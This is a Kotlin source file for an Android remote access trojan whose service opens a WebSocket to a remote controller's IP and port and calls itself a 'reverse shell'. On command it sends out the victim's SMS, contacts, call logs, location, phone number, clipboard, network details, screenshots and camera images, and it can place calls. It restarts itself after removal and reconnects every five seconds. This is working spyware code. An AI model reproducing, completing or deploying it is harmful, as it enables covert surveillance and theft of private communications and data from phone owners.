package com.nqmgaming.androidrat.service

import android.annotation.SuppressLint
import android.app.Service
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.os.IBinder
import android.provider.CallLog
import android.provider.Telephony
import android.telephony.TelephonyManager
import android.util.Log
import androidx.annotation.RequiresApi
import com.google.android.gms.location.FusedLocationProviderClient
import com.google.android.gms.location.LocationServices
import com.google.gson.Gson
import com.nqmgaming.androidrat.command.Battery
import com.nqmgaming.androidrat.command.DeviceInfo
import com.nqmgaming.androidrat.command.IpAddress
import com.nqmgaming.androidrat.command.Screenshot
import com.nqmgaming.androidrat.command.geoLocation
import com.nqmgaming.androidrat.core.util.Constant.IP_ADDRESS
import com.nqmgaming.androidrat.core.util.Constant.PORT
import com.nqmgaming.androidrat.core.util.MediaProjectionManagerHolder.mediaProjectionData
import com.nqmgaming.androidrat.data.dto.MessageDto
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.WebSocket
import okhttp3.WebSocketListener
import okhttp3.Response
import okio.ByteString
import java.io.File
import java.util.Timer

class WebSocketService : Service() {

    private var client: OkHttpClient = OkHttpClient()
    private var webSocket: WebSocket? = null
    private var reconnectTimer: Timer? = null
    private var lastCommandTime: Long = 0
    private lateinit var fusedLocationClient: FusedLocationProviderClient
    private val deviceId = Build.ID

    @RequiresApi(Build.VERSION_CODES.O)
    override fun onCreate() {
        super.onCreate()
        fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)
        // Khởi tạo WebSocket
        connectWebSocket()

    }

    private fun connectWebSocket() {
        val request = Request.Builder().url("ws://${IP_ADDRESS}:${PORT}").build()
        webSocket = client.newWebSocket(request, object : WebSocketListener() {

            override fun onOpen(webSocket: WebSocket, response: Response) {
                // Send Device Info
                val message: String =
                    "Hello there, welcome to reverse shell of ${Build.MODEL} \n" + "${Build.ID} \n" + HELP_COMMAND
                webSocket.send(message)
                // Hủy Timer khi kết nối thành công
                reconnectTimer?.cancel()
            }


            @SuppressLint("Range")
            @RequiresApi(Build.VERSION_CODES.M)
            override fun onMessage(webSocket: WebSocket, text: String) {
                println("Received text: $text")
                lastCommandTime = System.currentTimeMillis()
                if (text.contains(Build.ID)) {
                    onGetCommand(text, webSocket)
                }

            }

            @RequiresApi(Build.VERSION_CODES.M)
            override fun onMessage(webSocket: WebSocket, bytes: ByteString) {
                val message = "Received bytes: ${bytes.utf8()}"
                println(message)
                if (message.contains(Build.ID)) {
                    onGetCommand(bytes.utf8(), webSocket)
                }
            }

            override fun onClosing(webSocket: WebSocket, code: Int, reason: String) {
                webSocket.close(1000, null)
                println("Closing: $code / $reason")
            }

            override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
                // Bắt đầu Timer để thử kết nối lại sau mỗi 5 giây
                scheduleReconnect()
            }
        })
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return START_STICKY
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        val restartServiceIntent = Intent(applicationContext, this.javaClass)
        restartServiceIntent.setPackage(packageName)
        startService(restartServiceIntent)
        super.onTaskRemoved(rootIntent)
    }

    private fun scheduleReconnect() {
        Log.d("WebSocketService", "Reconnecting in 5 seconds")
        reconnectTimer?.cancel() // Hủy Timer trước đó nếu có
        reconnectTimer = Timer().apply {
            schedule(object : java.util.TimerTask() {
                override fun run() {
                    connectWebSocket()
                }
            }, 5000)
        }
    }

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }


    companion object {
        const val HELP_COMMAND = "Available commands:\n" +
                "1. help - Display this help message\n" +
                "2. info - Display device information\n" +
                "3. location - Get device location\n" +
                "4. ping - Check if device is online\n" +
                "5. phone_number - Get phone number\n" +
                "6. read_contacts - Read contacts\n" +
                "7. read_sms - Read SMS\n" +
                "8. read_call_logs - Read call logs\n" +
                "9. read_clipboard - Read clipboard content\n" +
                "10. battery - Get battery status\n" +
                "11. network_info - Get network information\n"
    }
    @RequiresApi(Build.VERSION_CODES.M)
    private fun onGetCommand(command: String, webSocket: WebSocket) {
        if (command.contains("help")) {
            webSocket.send(HELP_COMMAND + Build.ID)
        } else if (command.contains("ping")) {
            webSocket.send("pong")
        } else if (command.contains("info")) {
            val info = DeviceInfo.getDeviceInfo()
            webSocket.send(info)
        } else if (command.contains("location")) {
            val geoLocation = geoLocation(this)
            val location = geoLocation.getLocation()
            webSocket.send(location.toString())
        } else if (command.contains("phone_number")) {
            val telephoneManager =
                getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
            val phoneNumber = "Target phone number: ${telephoneManager.line1Number}"
            webSocket.send(phoneNumber)
        } else if (command.contains("read_contacts")) {
            var contacts = ""
            val cursor = contentResolver.query(
                android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                null,
                null,
                null,
                null
            )
            while (cursor!!.moveToNext()) {
                val nameIndex = cursor.getColumnIndex(Telephony.Sms.ADDRESS)
                val numberIndex = cursor.getColumnIndex(Telephony.Sms.BODY)

                val name = if (nameIndex != -1) cursor.getString(nameIndex) else null
                val number = if (numberIndex != -1) cursor.getString(numberIndex) else null

                contacts += "Name: $name\nNumber: $number\n\n"
            }
            cursor.close()
            if (contacts.isEmpty()) {
                contacts = "No contacts found"
                webSocket.send(contacts)
            } else {
                webSocket.send(contacts)
            }
        } else if (command.contains("read_sms")) {
            val cursor = contentResolver.query(
                Telephony.Sms.CONTENT_URI,
                null,
                null,
                null,
                null
            )

            val messageList = mutableListOf<MessageDto>()
            while (cursor!!.moveToNext()) {
                val idIndex = cursor.getColumnIndex(Telephony.Sms._ID)
                val messageIndex = cursor.getColumnIndex(Telephony.Sms.BODY)
                val senderIndex = cursor.getColumnIndex(Telephony.Sms.ADDRESS)
                val receiverIndex = cursor.getColumnIndex(Telephony.Sms.Inbox.PERSON)
                val dateIndex = cursor.getColumnIndex(Telephony.Sms.DATE)

                val id = if (idIndex != -1) cursor.getString(idIndex) else null
                val message = if (messageIndex != -1) cursor.getString(messageIndex) else null
                val sender = if (senderIndex != -1) cursor.getString(senderIndex) else null
                val receiver = if (receiverIndex != -1) cursor.getString(receiverIndex) else null
                val date = if (dateIndex != -1) cursor.getString(dateIndex) else null
                val messageDto =
                    MessageDto(id, message, date, deviceId, sender, receiver)
                messageList.add(messageDto)
            }
            cursor.close()

            // convert messageList to JSON string
            val messageListJson = Gson().toJson(messageList)
            if (messageListJson.isEmpty()) {
                webSocket.send("No SMS found")
            } else {
                webSocket.send(messageListJson)
            }

        } else if (command.contains("read_call_logs")) {
            var callLogs = ""
            val cursor = contentResolver.query(
                CallLog.Calls.CONTENT_URI,
                null,
                null,
                null,
                null
            )
            while (cursor!!.moveToNext()) {
                val numberIndex = cursor.getColumnIndex(CallLog.Calls.NUMBER)
                val nameIndex = cursor.getColumnIndex(CallLog.Calls.CACHED_NAME)
                val statusIndex = cursor.getColumnIndex(CallLog.Calls.TYPE)
                val durationIndex = cursor.getColumnIndex(CallLog.Calls.DURATION)

                val number = if (numberIndex != -1) cursor.getString(numberIndex) else null
                val name = if (nameIndex != -1) cursor.getString(nameIndex) else null
                val status = if (statusIndex != -1) cursor.getString(statusIndex) else null
                val duration = if (durationIndex != -1) cursor.getString(durationIndex) else null

                callLogs += "Name: $name\nNumber: $number\nStatus: $status\nDuration: $duration\n\n"
            }
            cursor.close()
            if (callLogs.isEmpty()) {
                callLogs = "No call logs found"
            }
            webSocket.send(callLogs)
        } else if (command.contains("call")) {
            // get number from command format: call:1234567890
            val number = command.split(":")[1]
            val intent = Intent(Intent.ACTION_CALL)
            intent.data = Uri.parse("tel:$number")
            startActivity(intent)
        } else if (command.contains("sms")) {
            val number = "+1234567890"
            val message = "Hello, this is a test message"
            val intent = Intent(Intent.ACTION_VIEW, Uri.parse("sms:$number"))
            intent.putExtra("sms_body", message)
            startActivity(intent)
        } else if (command.contains("read_clipboard")) {
            // In WebSocketService.kt, inside the onMessage method for the "read_clipboard" command
            val clipboardRequestIntent =
                Intent("com.nqmgaming.androidrat.CLIPBOARD_REQUEST")
            applicationContext.sendBroadcast(clipboardRequestIntent)
        } else if (command.contains("battery")) {
            val batteryStatus = Battery.getAllBatteryInfo(applicationContext)
            webSocket.send(batteryStatus)
        } else if (command.contains("network_info")) {
            val networkInfo = IpAddress.getNetworkInfo(applicationContext)
            webSocket.send(networkInfo)
        } else if (command.contains("take_screen")) {
            val screenshotIntent =
                Intent(this@WebSocketService, ScreenshotService::class.java)
            screenshotIntent.action = "START_SCREENSHOT"
            screenshotIntent.putExtra("PROJECTION_DATA", mediaProjectionData)
            startService(screenshotIntent)
        } else if (command.contains("take_picture")) {
            val path = Screenshot.captureImage(this@WebSocketService, false)
            try {
                val file = File(path)
                if (file.exists()) {
                    webSocket.send("Image captured successfully")
                } else {
                    webSocket.send("Failed to capture image")
                }
            } catch (e: Exception) {
                webSocket.send("Failed to capture image")
            }
        } else {
            webSocket.send("Unknown command")
        }
    }

}
